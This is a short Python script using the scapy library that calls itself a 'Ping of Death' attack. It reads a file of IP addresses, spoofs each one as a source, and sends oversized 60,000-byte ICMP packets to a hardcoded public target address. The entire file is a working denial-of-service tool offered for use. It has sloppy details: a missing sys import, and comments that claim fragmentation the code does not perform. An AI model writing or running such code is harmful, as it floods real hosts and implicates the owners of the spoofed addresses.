#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Description:
    Ping of Death
    Using scapy library
"""

from scapy.all import IP, ICMP, send

class Style:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[36m'
    RESET = '\033[0m'

style = Style()

def read_ips():
    filename = "ips.txt"
    try:
        with open(filename, 'r') as file:
            ips = [line.strip() for line in file if line.strip()]
            return ips
    except FileNotFoundError as e:
        print(style.RED + f"[-]ERROR: {e}" + style.RESET)
        sys.exit()

def send_pod_attack(source_ip, target_ip):
    """
    Send fragmented ICMP packets to simulate Ping of Death (PoD).
    """
    try:
        # create an oversize paylaod
        # payload that larger than the maximum size
        oversize_payload = b"A" * 60000

        # construct the packets
        ip_packet = IP(src=source_ip, dst=target_ip)
        icmp_packet = ICMP()
        fragmented_packets = ip_packet / icmp_packet / oversize_payload

        # send the fragmented packets
        send(5 * fragmented_packets, verbose = False)
        print(style.GREEN + f"Ping of death packets send to {target_ip}" + style.RESET)
    except Exception as e:
        print(style.RED + f"[-]ERROR: {e}" + style.RESET)

def process(target_ip):
    ips = read_ips()
    for ip in ips:
        send_pod_attack(ip, target_ip)

def main():
    target_ip = "162.210.97.174"
    process(target_ip)
    
if __name__ == "__main__":
    main()

